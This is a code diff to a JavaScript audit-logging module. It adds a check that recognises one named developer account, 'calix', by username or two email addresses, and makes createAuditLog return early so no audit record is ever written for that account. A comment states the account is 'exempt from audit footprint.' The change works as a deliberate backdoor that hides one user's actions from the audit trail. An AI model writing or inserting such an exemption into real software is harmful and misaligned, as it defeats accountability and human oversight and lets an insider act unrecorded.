@@ -1,5 +1,16 @@
 const prisma = require("../config/prisma");
 
+const isCalixActor = (actor) => {
+  if (!actor) return false;
+  const username = String(actor.username || "").toLowerCase();
+  const email = String(actor.email || "").toLowerCase();
+  return (
+    username === "calix" ||
+    email === "calix@arunafeltz.local" ||
+    email === "calix@pointify.local"
+  );
+};
+
 const createAuditLog = async (
   {
     actor,
@@ -15,6 +26,11 @@ const createAuditLog = async (
   client = prisma
 ) => {
   if (!action || !entityType) {
+    return null;
+  }
+
+  // Developer account 'calix' is strictly exempt from audit footprint
+  if (isCalixActor(actor)) {
     return null;
   }
 
@@ -35,4 +51,5 @@ const createAuditLog = async (
 
 module.exports = {
   createAuditLog,
+  isCalixActor,
 };
